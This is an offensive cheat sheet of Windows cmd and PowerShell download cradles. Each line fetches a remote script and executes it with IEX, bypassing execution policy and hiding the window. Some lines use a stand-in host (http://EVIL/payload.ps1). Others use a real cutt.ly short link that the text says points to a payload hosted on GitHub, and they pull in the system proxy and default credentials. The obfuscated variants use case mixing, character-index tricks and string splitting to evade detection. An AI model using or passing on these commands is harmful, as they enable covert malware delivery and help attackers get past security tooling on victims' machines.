# not proxy aware cmd download cradles 

# default download cradle 
c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/payload.ps1\")"
PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNdOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/payload.ps1\")"

# obfuscated
CMD> c:\wiNdoWs\sysTEM32\CmD  /c  pOWeRsheLl -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"
CMD> pOWeRshell -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"




# proxy aware cmd download cradles
# Info: Because you are limited in length, you have to use a shortcut link to the raw link from your hosted payload on Github
# For example, https://cutt.ly/syFzILH directs to the raw link of hosted payload on github

# default download cradle
c:\wInDOwS\sysTem32\CmD   /cPowErShell -wINdowstYL  Hi  -nop -eXecU ByPAss -COm    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $c.downloadstring(\"https://cutt.ly/syFzILH\")"
PowErShell -wINdOwstYL  Hi  -nop -eXecU BYpAss -COm    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $c.downloadstring(\"https://cutt.ly/syFzILH\")"

# obfuscated 
C:\WINdOWS\SySteM32\CmD.EXe  /cpOWershEll  -eXecut byPaSS -Noprof  -w  H -Co    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;`i`e`x $c.downloadstring(\"ht\"+\"tps://cutt.ly/syFzILH\")"
poWershELl -eXecUT byPAss -WINDo  1  -nOpR  -coMm  "& ((vARiaBlE '*mdr*').Name[3,11,2]-JoiN'') ((('{2}c=new-obj'+'ect ne'+'t.'+'webclient;{2'+'}'+'c.p'+'roxy='+'[Net'+'.'+'WebR'+'equest]::'+'GetS'+'yst'+'emWebP'+'ro'+'x'+'y();{'+'2}c'+'.Pr'+'oxy.Cre'+'dentials=[Net'+'.Cr'+'edentialC'+'ache]::D'+'e'+'fau'+'l'+'tCredenti'+'als'+';{0}i{0}e'+'{0}x {'+'2}c.downl'+'oa'+'ds'+'t'+'ring({1}ht{1}+{1'+'}t'+'ps'+':'+'/'+'/'+'cutt.ly/syFzIL'+'H{1})') -F  [cHAR]96,[cHAR]34,[cHAR]36))"
